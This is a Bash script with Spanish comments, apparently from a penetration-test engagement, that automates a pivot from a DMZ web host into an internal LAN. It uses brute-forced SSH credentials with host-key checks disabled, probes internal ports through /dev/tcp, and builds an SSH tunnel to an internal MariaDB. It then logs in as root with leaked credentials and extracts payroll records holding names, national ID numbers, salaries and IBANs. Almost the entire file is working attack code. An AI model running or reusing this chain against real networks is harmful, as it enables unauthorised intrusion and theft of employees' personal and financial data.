#!/bin/bash
# ============================================================================
#  FASE 5: Movimiento lateral / pivote DMZ -> LAN
#  Cadena: SSH fuerza-bruta en apex-web (DMZ) -> túnel a la LAN interna ->
#          acceso root a MariaDB (apex-db) con credenciales filtradas por FTP.
# ============================================================================
T=172.20.17.230          # perímetro del cliente (apex-fw WAN)
OUT=/home/jamsec/auditoria
mkdir -p "$OUT"
LOG="$OUT/07-pivote.txt"
exec > >(tee "$LOG") 2>&1

echo "=== FASE 5: PIVOTE DMZ -> LAN ==="
echo "[*] Foothold por SSH en apex-web (DMZ) con credenciales fuerza-bruta soporte:soporte123"
sshpass -p 'soporte123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p 2222 soporte@"$T" 'echo "    DENTRO de: $(hostname) / $(hostname -I)"; echo "    -> probando alcance a la LAN interna:"; for h in 10.30.10.10:3306 10.30.10.20:21; do ip=${h%:*}; pt=${h#*:}; (echo >/dev/tcp/$ip/$pt) 2>/dev/null && echo "       $h ALCANZABLE (pivote OK)" || echo "       $h no"; done'

echo "[*] Estableciendo túnel a la BBDD interna (10.30.10.10:3306) a través de apex-web"
sshpass -p 'soporte123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p 2222 -f -N -L 13306:10.30.10.10:3306 soporte@"$T"
sleep 3

echo "[*] Acceso root a MariaDB interna con credenciales filtradas por FTP (root/toor):"
mysql -h 127.0.0.1 -P 13306 -u root -ptoor -e "SELECT 'ACCESO ROOT BBDD INTERNA OK' AS resultado; SHOW DATABASES;" 2>&1
echo "[*] Exfiltración de nóminas desde la LAN interna:"
mysql -h 127.0.0.1 -P 13306 -u root -ptoor -e "SELECT empleado,dni,salario_bruto,iban FROM apexgestoria.nominas;" 2>&1

# limpiar túnel
pkill -f "13306:10.30.10.10:3306" 2>/dev/null
echo "=== FIN PIVOTE ==="
